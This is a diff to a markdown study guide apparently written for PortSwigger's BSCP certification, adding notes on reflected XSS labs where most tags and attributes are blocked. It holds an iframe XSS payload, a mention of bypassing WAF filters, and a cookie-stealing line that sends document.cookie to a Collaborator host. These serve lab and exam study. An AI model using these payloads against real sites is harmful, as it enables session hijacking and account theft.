@@ -39,12 +39,20 @@ Maybe we can use the acronym BSCP, like OSCP  :)
 
 [PortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)  
   
+>Host **iframe** code on exploit server and deliver exploit link to victim.  
+
+```html
+<iframe src="https://TARGET.web.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
+```  
+
 ### Cookie Stealers (Reflected)  
 
->Search with Reflected XSS deliver Phishing link to victim with cookie stealing payload.  
+>In the Search function on webapp a Reflected XSS is identified, then deliver exploit link to victim with cookie stealing payload in hosted **iframe** on exploit server.  
 
-<sub>WAF is preventing dangerous search filters and tags!</sub>  
+>WAF is preventing dangerous search filters and tags, then nypass XSS filters using JavaScript global variables.  
 
+[Bypass XSS filters using JavaScript global variables](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/)  
+  
 ```JavaScript
 fetch("https://Collaborator.oastify.com/?c=" + btoa(document['cookie']))
 ```
